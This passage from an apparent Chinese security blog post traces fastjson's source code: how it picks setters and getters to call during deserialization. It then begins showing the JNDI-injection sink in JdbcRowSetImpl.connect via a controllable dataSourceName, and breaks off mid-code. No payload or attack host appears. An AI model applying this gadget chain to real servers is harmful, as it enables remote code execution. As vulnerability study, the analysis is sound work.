class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> (clazz.isEnum()) &#123;</span><br><span class="line">            derializer = <span class="keyword">new</span> EnumDeserializer(clazz);</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span> (clazz.isArray()) &#123;</span><br><span class="line">            derializer = ObjectArrayCodec.instance;</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span> (clazz != Set.class &amp;&amp; clazz != HashSet.class &amp;&amp; clazz != Collection.class &amp;&amp; clazz != List.class &amp;&amp; clazz != ArrayList.class) &#123;</span><br><span class="line">            <span class="keyword">if</span> (Collection.class.isAssignableFrom(clazz)) &#123;</span><br><span class="line">                derializer = CollectionCodec.instance;</span><br><span class="line">            &#125; <span class="keyword">else</span> <span class="keyword">if</span> (Map.class.isAssignableFrom(clazz)) &#123;</span><br><span class="line">                derializer = MapDeserializer.instance;</span><br><span class="line">            &#125; <span class="keyword">else</span> <span class="keyword">if</span> (Throwable.class.isAssignableFrom(clazz)) &#123;</span><br><span class="line">                derializer = <span class="keyword">new</span> ThrowableDeserializer(<span class="keyword">this</span>, clazz);</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                derializer = <span class="keyword">this</span>.createJavaBeanDeserializer(clazz, (Type)type);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            derializer = CollectionCodec.instance;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">this</span>.putDeserializer((Type)type, (ObjectDeserializer)derializer);</span><br><span class="line">        <span class="keyword">return</span> (ObjectDeserializer)derializer;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>经过简单的追溯，不难发现，传入的type并不是java默认的class；这也正常，因为从一开始就是自己构造的一个javaclass；敏感点在</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ClassLoader classLoader = Thread.currentThread().getContextClassLoader();</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>会去调用相应的classloader去加载自己创建的class；</p>
<p>一路调用到此</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (clazz.isEnum()) &#123;</span><br><span class="line">    derializer = <span class="keyword">new</span> EnumDeserializer(clazz);</span><br><span class="line">&#125; <span class="keyword">else</span> <span class="keyword">if</span> (clazz.isArray()) &#123;</span><br><span class="line">    derializer = ObjectArrayCodec.instance;</span><br><span class="line">&#125; <span class="keyword">else</span> <span class="keyword">if</span> (clazz != Set.class &amp;&amp; clazz != HashSet.class &amp;&amp; clazz != Collection.class &amp;&amp; clazz != List.class &amp;&amp; clazz != ArrayList.class) &#123;</span><br><span class="line">    <span class="keyword">if</span> (Collection.class.isAssignableFrom(clazz)) &#123;</span><br><span class="line">        derializer = CollectionCodec.instance;</span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (Map.class.isAssignableFrom(clazz)) &#123;</span><br><span class="line">        derializer = MapDeserializer.instance;</span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (Throwable.class.isAssignableFrom(clazz)) &#123;</span><br><span class="line">        derializer = <span class="keyword">new</span> ThrowableDeserializer(<span class="keyword">this</span>, clazz);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        derializer = <span class="keyword">this</span>.createJavaBeanDeserializer(clazz, (Type)type);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>进入主要的分析点；进入createJavaBeanDeserializer函数；</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> ObjectDeserializer <span class="title">createJavaBeanDeserializer</span><span class="params">(Class&lt;?&gt; clazz, Type type)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">boolean</span> asmEnable = <span class="keyword">this</span>.asmEnable;</span><br><span class="line">    <span class="keyword">if</span> (asmEnable) &#123;</span><br><span class="line">        JSONType jsonType = (JSONType)clazz.getAnnotation(JSONType.class);</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>因为jsonType为null；这在之前已经分析过；所以直接过if函数；最后关键的点是</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">new</span> JavaBeanDeserializer(<span class="keyword">this</span>, clazz, type);</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>实力化JavaBeanDeserializer类；</p>
<p>看下其构造器：</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="title">JavaBeanDeserializer</span><span class="params">(ParserConfig config, Class&lt;?&gt; clazz, Type type)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">this</span>(config, JavaBeanInfo.build(clazz, type, config.propertyNamingStrategy));<span class="comment">//第三个参数null；</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>调用JavaBeanInfo下的build方法；</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> JavaBeanInfo <span class="title">build</span><span class="params">(Class&lt;?&gt; clazz, Type type, PropertyNamingStrategy propertyNamingStrategy)</span> </span>&#123;</span><br><span class="line">    JSONType jsonType = (JSONType)clazz.getAnnotation(JSONType.class);</span><br><span class="line">    Class&lt;?&gt; builderClass = getBuilderClass(jsonType);</span><br><span class="line">    Field[] declaredFields = clazz.getDeclaredFields();</span><br><span class="line">    Method[] methods = clazz.getMethods();</span><br><span class="line">    Constructor&lt;?&gt; defaultConstructor = getDefaultConstructor(builderClass == <span class="keyword">null</span> ? clazz : builderClass);</span><br><span class="line">    Constructor&lt;?&gt; creatorConstructor = <span class="keyword">null</span>;</span><br><span class="line">    Method buildMethod = <span class="keyword">null</span>;</span><br><span class="line">    List&lt;FieldInfo&gt; fieldList = <span class="keyword">new</span> ArrayList();</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>因为jsonType拿到null；所以builderClass也为null；declaredFields为拿到所有属性，将其放在数组中，methods拿到类，其父类的public方法和实现其接口的方法。放到数组中，builderClass因为未传入所以这里构造器拿到的是自定义的s1mple构造器；因为存在Constructor；</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (defaultConstructor == <span class="keyword">null</span> &amp;&amp; !clazz.isInterface() &amp;&amp; !Modifier.isAbstract(clazz.getModifiers()))</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>所以这个if直接过；也是因为没有传入builderClass所以可直接过很多判断，最后来到关键代码段；</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">Method[] var30 = methods;</span><br><span class="line"><span class="keyword">int</span> var29 = methods.length;</span><br><span class="line">Method method;</span><br><span class="line"><span class="keyword">for</span>(i = <span class="number">0</span>; i &lt; var29; ++i) &#123;</span><br><span class="line">    method = var30[i];</span><br><span class="line">    ordinal = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">int</span> serialzeFeatures = <span class="number">0</span>;</span><br><span class="line">    parserFeatures = <span class="number">0</span>;</span><br><span class="line">    String methodName = method.getName();</span><br><span class="line">    <span class="keyword">if</span> (methodName.length() &gt;= <span class="number">4</span> &amp;&amp; !Modifier.isStatic(method.getModifiers()) &amp;&amp; (method.getReturnType().equals(Void.TYPE) || method.getReturnType().equals(method.getDeclaringClass()))) &#123;</span><br><span class="line">        Class&lt;?&gt;[] types = method.getParameterTypes();</span><br><span class="line">        <span class="keyword">if</span> (types.length == <span class="number">1</span>) &#123;</span><br><span class="line">            annotation = (JSONField)method.getAnnotation(JSONField.class);</span><br><span class="line">            <span class="keyword">if</span> (annotation == <span class="keyword">null</span>) &#123;</span><br><span class="line">                annotation = TypeUtils.getSuperMethodAnnotation(clazz, method);</span><br><span class="line">            &#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>显然的是java在此将class中和其父类的的所有公有方法和实现接口的方法全部拿到；这里也对所有public方法做出了要求；</p>
<p>可以看到其函数名称长度需要不小于4，并且方法不为static类型；而且返回值需要为void；最后的限定的条件是“或”为改方法所在类的class对象；最后一个判定并不是必须；</p>
<p>在我定义的类中使用了toString方法，其优先调用，所以不满足返回值为void；直接pass掉，重新在method数组中拿到另外的方法进入程序，因为发现这里有个限定的条件是返回类型必须为void；所以这里也就差不多是关于属性修改器的一些操作；因为只有这些方法其返回值为void；在拿到符合方法的时候进入后续，仅可一个参数；然后拿到其函数的注释，这里为null；因为在自定义类中没有加入注释；</p>
<p>然后进入</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">annotation = TypeUtils.getSuperMethodAnnotation(clazz, method);</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>追溯下；</p>
<p><a target="_blank" rel="noopener" href="https://imgtu.com/i/cOFjaQ"><img src="https://z3.ax1x.com/2021/04/22/cOFjaQ.png" alt="cOFjaQ.png"></a></p>
<p>看到首先去拿类的接口信息，但是自定义类并无继承接口，所以自然过if；可以清晰的看到，如果自定以的类继承有接口，那么就会去找相应的实现接口类下的public方法；</p>
<p><a target="_blank" rel="noopener" href="https://imgtu.com/i/cOk0L8"><img src="https://z3.ax1x.com/2021/04/22/cOk0L8.png" alt="cOk0L8.png"></a></p>
<p>清晰的看到，如果有父类，则也会去拿相应父类下的public类型的方法；这里都没有，所以返回为null；</p>
<p>进入原来的类分析；</p>
<p><a target="_blank" rel="noopener" href="https://imgtu.com/i/cOkfyV"><img src="https://z3.ax1x.com/2021/04/22/cOkfyV.png" alt="cOkfyV.png"></a></p>
<p>因为annotation为空，所以直接进入后续的if；这里是对setter的纠错代码；</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (c3 == <span class="string">&#x27;_&#x27;</span>) &#123;</span><br><span class="line">    propertyName = methodName.substring(<span class="number">4</span>);</span><br><span class="line">&#125; <span class="keyword">else</span> <span class="keyword">if</span> (c3 == <span class="string">&#x27;f&#x27;</span>) &#123;</span><br><span class="line">    propertyName = methodName.substring(<span class="number">3</span>);</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (methodName.length() &lt; <span class="number">5</span> || !Character.isUpperCase(methodName.charAt(<span class="number">4</span>))) &#123;</span><br><span class="line">        <span class="keyword">continue</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>java中会过滤下划线，这里如果第四个字母为下划线；就会忽略，然后从第五个字母开始向后进行续接；</p>
<p>相反的是如果一切都满足原本的需求则会直接将第四个字符转小写，然后拼接上后续的字符形成变量；</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">propertyName = Character.toLowerCase(methodName.charAt(<span class="number">3</span>)) + methodName.substring(<span class="number">4</span>);</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>这句代码可看的很明白；不过多解释；</p>
<p>然后fastjson会去类中找相应的属性，如果没找到并且相应的函数返回值为boolean，则会将属性前加上is然后将第一个字符转大写和后面的其他自符进行拼接当作属性去类中寻找，代码如下：</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">Field field = TypeUtils.getField(clazz, propertyName, declaredFields);</span><br><span class="line"><span class="keyword">if</span> (field == <span class="keyword">null</span> &amp;&amp; types[<span class="number">0</span>] == Boolean.TYPE) &#123;</span><br><span class="line">    isFieldName = <span class="string">&quot;is&quot;</span> + Character.toUpperCase(propertyName.charAt(<span class="number">0</span>)) + propertyName.substring(<span class="number">1</span>);</span><br><span class="line">    field = TypeUtils.getField(clazz, isFieldName, declaredFields);</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>最后执行add方法；得到的方法变量名存于可反序列化list中，这个set方法就可以被调用。</p>
<p>总结下set方法的筛选是先整体的进行处理下，去寻找有返回值的函数，然后再次进行细致的筛选出set开头的函数，然后在纠错set；最后将set添加的序列化字符串中；处理完setter之后，fastjson开始处理getter；追溯一下getter的处理流程；学习其fastjson的设计思路；</p>
<h2 id="来看getter；"><a href="#来看getter；" class="headerlink" title="来看getter；"></a>来看getter；</h2><p>先来看对属性的处理方法；</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">Field[] var31 = clazz.getFields();</span><br><span class="line">var29 = var31.length;</span><br><span class="line"></span><br><span class="line">FieldInfo fieldInfo;</span><br><span class="line"><span class="keyword">for</span>(i = <span class="number">0</span>; i &lt; var29; ++i) &#123;</span><br><span class="line">    Field field = var31[i];</span><br><span class="line">    ordinal = field.getModifiers();</span><br><span class="line">    <span class="keyword">if</span> ((ordinal &amp; <span class="number">8</span>) == <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="keyword">if</span> ((ordinal &amp; <span class="number">16</span>) != <span class="number">0</span>) &#123;</span><br><span class="line">            fieldType = field.getType();</span><br><span class="line">            <span class="keyword">boolean</span> supportReadOnly = Map.class.isAssignableFrom(fieldType) || Collection.class.isAssignableFrom(fieldType) || AtomicLong.class.equals(fieldType) || AtomicInteger.class.equals(fieldType) || AtomicBoolean.class.equals(fieldType);</span><br><span class="line">            <span class="keyword">if</span> (!supportReadOnly) &#123;</span><br><span class="line">                <span class="keyword">continue</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>清晰的看到getter先拿到类和其父类public的字段，也就是属性将其放入数组中，然后遍历一下，拿到其修饰符；当不为static的时候进入第二个if；当修饰符为final的时候，直接拿到其类型，然后进入或运算；然后判断其是否支持只读；</p>
<p>之后进入一个比较细致的代码段：</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">boolean</span> contains = <span class="keyword">false</span>;</span><br><span class="line">        Iterator var53 = fieldList.iterator();</span><br><span class="line"></span><br><span class="line">        <span class="keyword">while</span>(var53.hasNext()) &#123;</span><br><span class="line">            fieldInfo = (FieldInfo)var53.next();</span><br><span class="line">            <span class="keyword">if</span> (fieldInfo.name.equals(field.getName())) &#123;</span><br><span class="line">                contains = <span class="keyword">true</span>;</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (!contains) &#123;</span><br><span class="line">            parserFeatures = <span class="number">0</span>;</span><br><span class="line">            serialzeFeatures = <span class="number">0</span>;</span><br><span class="line">            parserFeatures = <span class="number">0</span>;</span><br><span class="line">            String propertyName = field.getName();</span><br><span class="line">            JSONField fieldAnnotation = (JSONField)field.getAnnotation(JSONField.class);</span><br><span class="line">            <span class="keyword">if</span> (fieldAnnotation != <span class="keyword">null</span>) &#123;</span><br><span class="line">                <span class="keyword">if</span> (!fieldAnnotation.deserialize()) &#123;</span><br><span class="line">                    <span class="keyword">continue</span>;</span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">                parserFeatures = fieldAnnotation.ordinal();</span><br><span class="line">                serialzeFeatures = SerializerFeature.of(fieldAnnotation.serialzeFeatures());</span><br><span class="line">                parserFeatures = Feature.of(fieldAnnotation.parseFeatures());</span><br><span class="line">                <span class="keyword">if</span> (fieldAnnotation.name().length() != <span class="number">0</span>) &#123;</span><br><span class="line">                    propertyName = fieldAnnotation.name();</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> (propertyNamingStrategy != <span class="keyword">null</span>) &#123;</span><br><span class="line">                propertyName = propertyNamingStrategy.translate(propertyName);</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            add(fieldList, <span class="keyword">new</span> FieldInfo(propertyName, (Method)<span class="keyword">null</span>, field, clazz, type, parserFeatures, serialzeFeatures, parserFeatures, (JSONField)<span class="keyword">null</span>, fieldAnnotation, (String)<span class="keyword">null</span>));</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>先来看代码；利用java的迭代器；将之前的set进行的属性拿出放到迭代器中；</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">while</span>(var53.hasNext()) &#123;</span><br><span class="line">    fieldInfo = (FieldInfo)var53.next();</span><br><span class="line">    <span class="keyword">if</span> (fieldInfo.name.equals(field.getName())) &#123;</span><br><span class="line">        contains = <span class="keyword">true</span>;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>进入while循环判断其下一个是否有元素；如果存在元素，则fileInfo进行读取；然后和public属性进行比对，这一步是为了确认其是否为public的属性；如果是public的属性，那么contains就为true；一个比较细致的代码点在后面；</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (!contains) &#123;</span><br><span class="line">            parserFeatures = <span class="number">0</span>;</span><br><span class="line">            serialzeFeatures = <span class="number">0</span>;</span><br><span class="line">            parserFeatures = <span class="number">0</span>;</span><br><span class="line">            String propertyName = field.getName();</span><br><span class="line">            JSONField fieldAnnotation = (JSONField)field.getAnnotation(JSONField.class);</span><br><span class="line">            <span class="keyword">if</span> (fieldAnnotation != <span class="keyword">null</span>) &#123;</span><br><span class="line">                <span class="keyword">if</span> (!fieldAnnotation.deserialize()) &#123;</span><br><span class="line">                    <span class="keyword">continue</span>;</span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">                parserFeatures = fieldAnnotation.ordinal();</span><br><span class="line">                serialzeFeatures = SerializerFeature.of(fieldAnnotation.serialzeFeatures());</span><br><span class="line">                parserFeatures = Feature.of(fieldAnnotation.parseFeatures());</span><br><span class="line">                <span class="keyword">if</span> (fieldAnnotation.name().length() != <span class="number">0</span>) &#123;</span><br><span class="line">                    propertyName = fieldAnnotation.name();</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> (propertyNamingStrategy != <span class="keyword">null</span>) &#123;</span><br><span class="line">                propertyName = propertyNamingStrategy.translate(propertyName);</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            add(fieldList, <span class="keyword">new</span> FieldInfo(propertyName, (Method)<span class="keyword">null</span>, field, clazz, type, parserFeatures, serialzeFeatures, parserFeatures, (JSONField)<span class="keyword">null</span>, fieldAnnotation, (String)<span class="keyword">null</span>));</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>敏感的代码点在此；如果contains不为false；则该变量直接丢掉，不能进入add；即如果属性为public，则会直接丢掉，否则之前set的几个属性则可以进入add；将其设入待反序列化的字段中；不难发现翻翻代码即可看到原理；</p>
<h3 id="下面进入对方法的处理"><a href="#下面进入对方法的处理" class="headerlink" title="下面进入对方法的处理"></a>下面进入对方法的处理</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">var30 = clazz.getMethods();</span><br><span class="line">var29 = var30.length;</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span>(i = <span class="number">0</span>; i &lt; var29; ++i) &#123;</span><br><span class="line">    method = var30[i];</span><br><span class="line">    String methodName = method.getName();</span><br><span class="line">    <span class="keyword">if</span> (methodName.length() &gt;= <span class="number">4</span> &amp;&amp; !Modifier.isStatic(method.getModifiers()) &amp;&amp; methodName.startsWith(<span class="string">&quot;get&quot;</span>) &amp;&amp; Character.isUpperCase(methodName.charAt(<span class="number">3</span>)) &amp;&amp; method.getParameterTypes().length == <span class="number">0</span> &amp;&amp; (Collection.class.isAssignableFrom(method.getReturnType()) || Map.class.isAssignableFrom(method.getReturnType()) || AtomicBoolean.class == method.getReturnType() || AtomicInteger.class == method.getReturnType() || AtomicLong.class == method.getReturnType())) &#123;</span><br><span class="line">        JSONField annotation = (JSONField)method.getAnnotation(JSONField.class);</span><br><span class="line">        <span class="keyword">if</span> (annotation == <span class="keyword">null</span> || !annotation.deserialize()) &#123;</span><br><span class="line">            String propertyName;</span><br><span class="line">            <span class="keyword">if</span> (annotation != <span class="keyword">null</span> &amp;&amp; annotation.name().length() &gt; <span class="number">0</span>) &#123;</span><br><span class="line">                propertyName = annotation.name();</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                propertyName = Character.toLowerCase(methodName.charAt(<span class="number">3</span>)) + methodName.substring(<span class="number">4</span>);</span><br><span class="line">            &#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>拿到类中的全部方法；</p>
<p>可以很清楚的看到限制的条件；</p>
<p>长度大于4；不为static；以get开头，第四个字母为大写，没有参数；返回值类型继承于Map或者Collection类；或者AtomicBoolean，AtomicInteger，AtomicLong类；只有这样的getter才可被调用；</p>
<p>最后将断点打在函数上，追溯下，发现其最后确实是调用了此函数；</p>
<p><a target="_blank" rel="noopener" href="https://imgtu.com/i/czccqS"><img src="https://z3.ax1x.com/2021/04/25/czccqS.png" alt="czccqS.png"></a></p>
<h2 id="Fastjson之jndi注入"><a href="#Fastjson之jndi注入" class="headerlink" title="Fastjson之jndi注入"></a>Fastjson之jndi注入</h2><p>来看下调用链；</p>
<p>fastjson中存在一处jndi注入；直接进入JdbcRowSetImpl类中追溯下；</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">private</span> Connection <span class="title">connect</span><span class="params">()</span> <span class="keyword">throws</span> SQLException </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">this</span>.conn != <span class="keyword">null</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">this</span>.conn;</span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (<span class="keyword">this</span>.getDataSourceName() != <span class="keyword">null</span>) &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            InitialContext var1 = <span class="keyword">new</span> InitialContext();</span><br><span class="line">            DataSource var2 = (DataSource)var1.lookup(<span class="keyword">this</span>.getDataSourceName());</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">this</span>.getUsername() != <span class="keyword">null</span> &amp;&amp; !<span class="keyword">this</span>.getUsername().equals(<span class="string">&quot;&quot;</span>) ? var2.getConnection(<span class="keyword">this</span>.getUsername(), <span class="keyword">this</span>.getPassword()) : var2.getConnection();</span><br><span class="line">        &#125; <span class="keyword">catch</span> (NamingException var3) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> SQLException(<span class="keyword">this</span>.resBundle.handleGetObject(<span class="string">&quot;jdbcrowsetimpl.connect&quot;</span>).toString());</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">this</span>.getUrl() != <span class="keyword">null</span> ? DriverManager.getConnection(<span class="keyword">this</span>.getUrl(), <span class="keyword">this</span>.getUsername(), <span class="keyword">this</span>.getPassword()) : <span class="keyword">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>很明显的jndi注入，看到lookup的地方直接传入getDataSourceName函数；追溯下；</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> String <span class="title">getDataSourceName</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> dataSource;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>拿到dataSource；看下这个属性我们是否可控；</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">setDataSourceName</span><span class="params">(String var1)</span> <span class="keyword">throws</span> SQLException </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">this</span>.getDataSourceName() != <span class="keyword">null</span>) &#123;</span><br><span class="line">        <span class="keyword">if</span> (!<span class="keyword">this</span>.getDataSourceName().equals(var1)) &#123;</span><br><span class="line">            <span class="keyword">super</span>.setDataSourceName(var1);</span><br><span class="line">            <span class="keyword">this</span>.conn = <span class="keyword">null</span>;</span><br><span class="line">            <span class="keyword">this</span>.ps = <span class="keyword">null</span>;</span><br><span class="line">            <span class="keyword">this</span>.rs = <span 